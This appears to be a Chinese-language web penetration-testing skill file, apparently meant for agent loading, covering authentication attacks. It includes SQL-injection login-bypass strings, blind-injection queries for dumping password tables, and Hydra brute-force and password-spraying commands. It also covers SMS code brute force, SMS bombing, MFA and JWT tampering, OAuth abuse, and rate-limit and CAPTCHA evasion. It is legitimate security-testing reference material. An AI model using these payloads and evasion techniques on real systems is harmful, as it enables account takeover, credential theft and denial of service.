# 认证全流程测试（auth-testing）

> 来源：jiejieskill SKILL.md 拆分（2026-08-11）。由 SKILL.md 相应章节按需加载。

### 6.3 认证全流程测试（注册 / 枚举 / 密码爆破 / 改密 / 短信验证码）

> 认证是 Web 渗透的最高优先级入口。按「注册 → 登录 → 会话 → 找回/改密」全流程测一遍，**任何一个环节的绕过都能拿身份**。

#### 用户注册测试
```bash
# 批量注册：资源耗尽 / 垃圾数据灌库
# 注册枚举：手机号/邮箱是否已注册 → 响应差异（撞库/撞号）
# 恶意注册：绕过邀请码 / 注册邀请码可爆破
# 注册逻辑绕过：前端校验绕过（改 JS / 重放包）、注册即登录
# 越权注册：注册参数带 role=admin / is_admin=1 → 高权限账号
# 风控绕过：同一设备批量注册、IP 轮换、换号
```

#### 用户枚举测试
```bash
# 响应差异：不同用户名 → 状态码/响应体长度/错误消息/响应时间 不同
# 登录/注册/找回密码接口：提示 "用户不存在" vs "密码错误" → 直接枚举
# 时间侧信道：存在的用户密码比对更耗时
# 批量枚举：Burp Intruder 用户名字典 → 响应分组对比
```

#### 登录测试
```bash
# 万能密码（配合 WAF 绕过）
admin' or '1'='1'--
' or 1=1#
admin'--
' or 1=1-- -
' or '1'='1
admin'/*
'or'='or'
1' or '1'='1' or '1'='1
# 用户名也试：' or 1=1#（用户名和密码两个位置都注入）
# 登录绕过：前端 JS 校验绕过、调试接口直连、JWT 篡改
# 锁定机制：错误次数锁定 → 能否被利用（拒绝服务 or 枚举辅助）
# 未限流登录接口：可无限尝试
```

#### 登录框 SQL 注入专项（SQLi + 认证绕过 + 弱口令探针）

> 登录框是最容易"看似安全实则裸拼接 SQL"的地方。PHP+MSSQL/MySQL 老系统尤其高发。
> 完整方法论分 4 层，按顺序推进，每层都能单独产出漏洞结论。

```bash
# ========= 第 0 层：还原 SQL 结构（报错回显型）=========
# 单引号触发错误 → 观察响应是否回显 SQL 语句
id=admin'          # 若回显 [error]_select * from <user_table> where <user_id>='admin'' and <password>='x'
#    → 拿到：表名、字段名(<user_id>/<password>)、WHERE 结构、是否拼接
#    → 这是「SQL 语句回显型」注入点，信息量最大，别错过

# ========= 第 1 层：认证绕过（无条件 vs 弱口令探针，两种语义）=========
# SQL 结构：select * from 密码表 where 账号字段='<id>' and 密码字段='<password>'
#
# ① 无条件绕过（必须注释掉尾部 and 密码条件）：
id=admin' OR 1=1-- -      # -- 注释尾部 and <password>='x' → 恒真 → 返回表第一行 → 登录成功(302)
#    注意：OR 1=1-- - 需要 -- 注释符；MySQL 可用 #，MSSQL 用 --
#
# ② '1'='1 弱口令探针（无注释符也能登录，AND 优先级是关键）：
id=test' or '1'='1 + password=123
#    SQL 变成：where <user_id>='test' or '1'='1' and <password>='123'
#    AND 优先级 > OR → 等价 <user_id>='test' OR ('1'='1' AND <password>='123')
#    → 当 password 恰好是某员工真实密码时，括号内恒真 → 登录成功！
#    → 本质：' or '1'='1 + 密码 P = 【弱口令探针】P 命中任一账号真实密码即绕过
#    实测 123、123456 都登录成功；密码 x 失败(无人用 x)
#    → 教训：别把 '1'='1 失败归因到"引号/注释"，换不同密码多试，密码真假才是变量

# ========= 第 2 层：布尔盲注提取密码表（绕过 → 拖库）=========
# oracle：登录成功(302/跳转) = 真，登录失败(200) = 假，二分逐字符提取
# 判断某字段值：
id=' OR ascii(substring((SELECT TOP 1 <user_id> FROM <user_table>),1,1))>=49-- -   # MSSQL
id=' OR ascii(substring((SELECT <user_id> FROM <user_table> LIMIT 1),1,1))>=49-- -  # MySQL
# 提取指定密码的账号（弱口令账号枚举）：
id=' OR ascii(substring((SELECT TOP 1 <user_id> FROM <user_table> WHERE <password>='123'),1,1))>=48-- -
# 脚本化：二分法 (lo=32,hi=126) 逐字符提取，比单字符遍历快
# 注意：TOP 1 无 ORDER BY 取的是表第一条，枚举多个用 WHERE <user_id> > '上一条' 递推

# ========= 第 3 层：数据库类型识别（选对语法）=========
# MSSQL：TOP 1 / ORDER BY / substring() / @@version / 表名常大写
# MySQL：LIMIT / SUBSTRING() / @@version / information_schema
# Oracle：ROWNUM / DUAL / SUBSTR()
# 报错回显里出现的语法(TOP 1 vs LIMIT)直接暴露 DB 类型，别用错函数
```

#### 密码爆破测试
```bash
# Burp Intruder：登录请求 → 密码字典 → 响应差异判断成功
# Hydra（Web 表单）
hydra -L users.txt -P top500.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
# 密码喷射（一个密码打多个账号，避免锁定）
hydra -L users.txt -p 'Spring2025!' target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
# 字典：rockyou.txt / top500.txt / 中国常见口令（姓名+生日、手机号、企业名+年份）
# 绕过限流：验证码 OCR 识别 / 并发多线程 / X-Forwarded-For 轮换
# ⚠️ 爆破前确认授权范围与速率限制，避免触发账号锁定
```

#### 修改密码 / 找回密码流程测试
```bash
# 修改密码
#   1. 是否校验原密码（不校验 → 可被 CSRF/越权利用）
#   2. 修改目标可控（user_id 参数篡改 → 改他人密码）
#   3. 新密码复杂度后端是否校验（弱口令绕过）
#   4. 改密后旧 token 是否失效（会话保持 → 会话固定）
# 找回密码
#   1. 流程跳步：跳过验证码步骤直达重置页
#   2. 验证码回显：重置接口/JS 响应直接返回验证码
#   3. 目标篡改：改接收手机号/邮箱 → 重置链接发到自己
#   4. 重置 token 可预测/固定/泄露：uuid 顺序、时间戳、日志
#   5. 新旧验证码重放 / 验证码与账号未绑定
#   6. ⚠️ 弱认证要素爆破：重置仅需「身份证后4码 + 生日月日4码」
#      → 后4码空间 10^4、生日月日空间 365，且无尝试次数锁定 → 可在线爆破任意员工密码
#      判断依据：认证要素的【搜索空间 × 是否有限流】。空间小 + 无锁定 = 可爆破。
#      测试：先枚举真实员工号 → 提交重置表单测错误响应是否有锁定/验证码 → 无则 Intruder 爆破
#      修复建议：图形/短信验证码 + 尝试次数锁定 + 提高认证要素强度（完整身份证号/手机验证码）
```

#### 短信验证码爆破测试（测试手机号 <测试手机号>，自行填写）
```bash
# 本技能统一使用测试手机号：<测试手机号>（注册/收验证码均用此号，自行填写）
# 适用场景：注册、登录、找回密码、修改密码、支付/绑定 等验证码接口

# 1. 定位验证码接口：抓包找 /sendSms /sms/send /sendCode /code 等路径
# 2. 6 位数字遍历：Burp Intruder 000000-999999，并发分组跑
# 3. 绕过限制的手段：
#    - 无次数限制 / 无发送间隔（可无限重发）
#    - 验证码不过期 / 重放有效
#    - 并发发送绕过计数（Turbo Intruder 多线程）
#    - 设备指纹绕过（改 IMEI/MAC/UA/设备号）
#    - IP 轮换 / X-Forwarded-For 伪造
#    - 图形验证码绕过（OCR / 前端改值绕过）
# 4. 常见缺陷：
#    - 验证码回显在响应中（JSON 直接返回 code）
#    - 万能验证码（000000/123456 后端硬编码）
#    - 验证码未绑定手机号（A 号验证码 B 号可用）
#    - 校验与发送解耦（改了手机号仍用旧验证码）
#    - 验证码出现在前端 JS / 日志 / 调试接口
# 5. 风控绕过思路：
#    - 先走一遍正常业务流程再爆破（规避行为检测）
#    - 判断限流是按手机号还是按 IP：按 IP 可换 IP 绕过
#    - 组合「合法调用 + 并发 + 分布式 IP」

# 6. 短信轰炸（与爆破不同：无限次发送 → 骚扰/资源耗尽/费用 DoS）
#    - 发送接口无次数限制 / 无发送间隔 → 同一手机号无限触发
#    - 改包绕过每设备次数：换设备指纹 / 换 IP / X-Forwarded-For
#    - 多场景轰炸：注册+登录+找回+绑定 每个接口都可发，叠加放大
#    - 影响：短信费用消耗（云成本 DoS）、目标手机号被骚扰/拉黑
#    - 测试号 <测试手机号> 用于验证，轰炸测试控制在少量次数内
```


---

#### 身份验证测试
> （补充视角，与上方用户枚举/登录测试互补，侧重认证实现细节）
```bash
# 用户名枚举
# 观察登录失败差异（响应长度、时间、错误消息）

# 暴力破解
hydra -l admin -P rockyou.txt <target_ip> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -p Spring2025! <target_ip> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"  # 密码喷射

# MFA 绕过测试
# → 直接访问内部页面跳过MFA
# → 修改响应中的 "mfa_required": true → false
# → 暴力破解6位MFA码
# → 检查是否可无限尝试
```

#### 会话管理
```bash
# Cookie 分析
# → 检查 Secure / HttpOnly / SameSite 标志
# → 会话固定攻击：登录前后session是否变化
# → JWT 攻击

# JWT 测试
jwt_tool <token>                           # 分析
jwt_tool <token> -X s                      # 自动测试
# 手动：alg=none, RS256→HS256, kid注入
```


#### OAuth / OIDC 测试（第三方登录高频）
```bash
# OAuth 2.0 / OIDC 攻击面
# 1. redirect_uri 篡改：
#    - 开放重定向（可信域上的跳转）、子域通配符、路径穿越
#    - 篡改 redirect_uri → 窃取 authorization code
# 2. state 参数缺失 / 可预测 → CSRF：绑定受害者账号到攻击者账号
# 3. scope 提权：scope=profile → scope=admin / openid 换 profile
# 4. authorization code 重用 / 未及时失效
# 5. token 端点：client_secret 硬编码、token 直接下发前端
# 6. OIDC 特有：id_token 算法混淆（RS256→HS256）、iss/aud 未校验
# 工具：oauth2-misconfig 扫描 / jwt_tool / Burp 插件
# 步骤：完整走登录流 → 逐个参数篡改 → 观察跳转与 token
```

#### WebSocket 测试（常被忽视的实时攻击面）
```bash
# 场景：聊天 / AI 流式回复 / 行情推送 / 协同编辑
# 1. 端点发现：抓包找 Upgrade: websocket / ws:// wss://
# 2. 鉴权缺失：握手是否校验 token/Cookie → 未认证可订阅
# 3. 越权订阅：改 channel/user id → 订阅他人会话数据（BOLA）
# 4. 消息注入：客户端输入未过滤 → 回显给其他客户端 XSS
# 5. 跨源连接：Origin 校验缺失 → CSWSH（跨站 WebSocket 劫持）
# 6. 消息重放/篡改：业务消息可伪造（聊天/命令）
# 工具：Burp（WS 抓包）/ ws 客户端 / wss 扫描器
# 步骤：看握手请求 → Origin/鉴权 → 订阅权限 → 消息处理
```

#### 图形验证码 / 打码平台绕过
```bash
# 图形验证码绕过
# 1. 识别是否必填：删除/清空验证码参数能否提交
# 2. OCR 识别：ddddocr（免费）、PaddleOCR
# 3. 打码平台：若快打码 / 图鉴 / 云打码（每千次几元）
# 4. 验证码复用：同一验证码多次提交
# 5. 错误后验证码不刷新
# 6. 前端校验绕过：验证码校验在 JS → 改响应/重放跳过
# 工具：ddddocr / 打码平台 API / Burp 插件 captcha-killer
```
